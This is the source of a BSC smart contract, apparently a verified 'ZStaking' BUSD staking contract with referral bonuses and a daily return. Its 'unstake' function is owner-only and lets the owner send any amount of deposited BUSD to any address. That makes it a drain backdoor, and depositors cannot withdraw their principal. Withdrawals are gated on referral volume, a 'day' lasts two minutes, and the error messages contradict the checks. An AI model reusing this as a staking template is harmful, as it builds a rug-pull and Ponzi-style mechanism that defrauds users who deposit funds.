/**
 *Submitted for verification at BscScan.com on 2022-11-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ZStaking {
    using SafeMath for uint256;
    BEP20 public busd = BEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); 
    uint256 private constant baseDivider = 1000;
    uint256 private constant dailyRoi = 2;
    uint256 private constant timeStep = 2 minutes;
    struct Player {
        address referrer;
        uint256 myLastDeposit;
        uint256 directBuzz;
        uint256 withdraw;
        uint256 totalIncome;
        uint256 totalInvestment;
    }
    mapping(address => Player) public players;
    struct UserDept{
        uint256 amount;
        uint256 depTime;
    }
    mapping(address => UserDept[]) public userDepts;
    
    address owner; 
    modifier onlyAdmin(){
        require(msg.sender == owner,"You are not authorized.");
        _;
    }
    constructor() public {
        owner = msg.sender;
    }
    function staking(address _referral, uint256 _busd) public {
        require(_busd >= 1e18, "Minimum 50 BUSD");
        busd.transferFrom(msg.sender, address(this), _busd);
        if(players[msg.sender].myLastDeposit==0){
            players[msg.sender].referrer=_referral;
        }
        players[players[msg.sender].referrer].directBuzz+=_busd;
        players[msg.sender].myLastDeposit=_busd;
        players[msg.sender].totalInvestment+=_busd;
        
        userDepts[msg.sender].push(UserDept(
            _busd,
            block.timestamp
        ));
        _distributeDeposit(_busd);
        unfreezeDepts(msg.sender);
    }
    function unstake(address buyer,uint _amount) public returns(uint){
        require(msg.sender == owner,"You are not staker.");
        busd.transfer(buyer,_amount);
        return _amount;
    }
    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(10).div(baseDivider);
        busd.transfer(owner,fee);
    }
    function unfreezeDepts(address _addr) private {
        for(uint i=0;i<userDepts[_addr].length;i++){
            UserDept storage pl = userDepts[_addr][i];
            if(block.timestamp>pl.depTime){
                uint256 totalDays=getCurDay(pl.depTime);
                players[_addr].totalIncome+=pl.amount.mul(dailyRoi).mul(totalDays).div(baseDivider);
            }
        }
    }
    function userDetails(address _addr) view external returns(uint256 lastdep,uint256 db,uint256 wd,uint256 tinv,uint256 ti) {
        uint myRoi;
        for(uint i=0;i<userDepts[_addr].length;i++){
            UserDept storage pl = userDepts[_addr][i];
            if(block.timestamp>pl.depTime){
                uint256 totalDays=getCurDay(pl.depTime);
                myRoi+=pl.amount.mul(dailyRoi).mul(totalDays).div(baseDivider);
            }
        }
        return (
           players[_addr].myLastDeposit,
           players[_addr].directBuzz,
           players[_addr].withdraw,
           players[_addr].totalInvestment,
           myRoi
        );
    }
    function withdraw(uint256 _amount) public{
        require(_amount >= 1e18, "Minimum 10 need");
        
        Player storage player = players[msg.sender];
        require(player.myLastDeposit <= player.directBuzz, "Direct Team Required");
        uint256 bonus=player.totalIncome-player.withdraw;
        require(_amount<=bonus,"Amount exceeds withdrawable");
        player.withdraw+=_amount;
        busd.transfer(msg.sender,_amount);
    }
    function getCurDay(uint256 startTime) public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }
}  

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}